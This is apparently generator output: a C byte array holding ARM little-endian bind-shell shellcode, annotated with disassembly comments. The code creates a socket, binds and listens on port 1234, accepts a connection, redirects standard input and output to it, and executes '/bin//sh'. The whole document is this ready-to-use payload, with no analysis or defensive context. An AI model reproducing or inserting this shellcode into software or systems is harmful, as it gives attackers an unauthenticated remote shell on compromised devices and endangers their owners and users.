
checking arm
added 1 modes
// Target architecture : ARM arm
// Endian mode         : little

#define BIND_SIZE 104

char BIND[] = {
  /* 0000 */ "\x54\x40\x9f\xe5" /* ldr      r4, [pc, #0x54] */
  /* 0004 */ "\x54\x50\x9f\xe5" /* ldr      r5, [pc, #0x54] */
  /* 0008 */ "\x54\x60\x9f\xe5" /* ldr      r6, [pc, #0x54] */
  /* 000C */ "\x01\x30\x8f\xe2" /* add      r3, pc, #1      */
  /* 0010 */ "\x13\xff\x2f\xe1" /* bx       r3              */
  /* 0014 */ "\x52\x40"         /* eors     r2, r2          */
  /* 0016 */ "\x01\x21"         /* movs     r1, #1          */
  /* 0018 */ "\x0f\x02"         /* lsls     r7, r1, #8      */
  /* 001A */ "\x19\x37"         /* adds     r7, #0x19       */
  /* 001C */ "\x02\x20"         /* movs     r0, #2          */
  /* 001E */ "\x01\xdf"         /* svc      #1              */
  /* 0020 */ "\x80\x46"         /* mov      r8, r0          */
  /* 0022 */ "\x21\x1c"         /* adds     r1, r4, #0      */
  /* 0024 */ "\x06\xb4"         /* push     {r1, r2}        */
  /* 0026 */ "\x69\x46"         /* mov      r1, sp          */
  /* 0028 */ "\x4a\x70"         /* strb     r2, [r1, #1]    */
  /* 002A */ "\x10\x22"         /* movs     r2, #0x10       */
  /* 002C */ "\x01\x37"         /* adds     r7, #1          */
  /* 002E */ "\x01\xdf"         /* svc      #1              */
  /* 0030 */ "\x01\x21"         /* movs     r1, #1          */
  /* 0032 */ "\x40\x46"         /* mov      r0, r8          */
  /* 0034 */ "\x02\x37"         /* adds     r7, #2          */
  /* 0036 */ "\x01\xdf"         /* svc      #1              */
  /* 0038 */ "\x52\x40"         /* eors     r2, r2          */
  /* 003A */ "\x49\x40"         /* eors     r1, r1          */
  /* 003C */ "\x40\x46"         /* mov      r0, r8          */
  /* 003E */ "\x01\x37"         /* adds     r7, #1          */
  /* 0040 */ "\x01\xdf"         /* svc      #1              */
  /* 0042 */ "\x80\x46"         /* mov      r8, r0          */
  /* 0044 */ "\x03\x21"         /* movs     r1, #3          */
  /* 0046 */ "\x3f\x27"         /* movs     r7, #0x3f       */
  /* 0048 */ "\x40\x46"         /* mov      r0, r8          */
  /* 004A */ "\x01\x39"         /* subs     r1, #1          */
  /* 004C */ "\x01\xdf"         /* svc      #1              */
  /* 004E */ "\xfa\xd1"         /* bne      #0x46           */
  /* 0050 */ "\x17\x1c"         /* adds     r7, r2, #0      */
  /* 0052 */ "\xe0\xb4"         /* push     {r5, r6, r7}    */
  /* 0054 */ "\x68\x46"         /* mov      r0, sp          */
  /* 0056 */ "\x0b\x27"         /* movs     r7, #0xb        */
  /* 0058 */ "\x01\xdf"         /* svc      #1              */
  /* 005A */ "\xc0\x46"         /* mov      r8, r8          */
  /* 005C */ "\x02\xff\x04\xd2"
  /* 0060 */ "\x2f\x62\x69\x6e"
  /* 0064 */ "\x2f\x2f\x73\x68"
};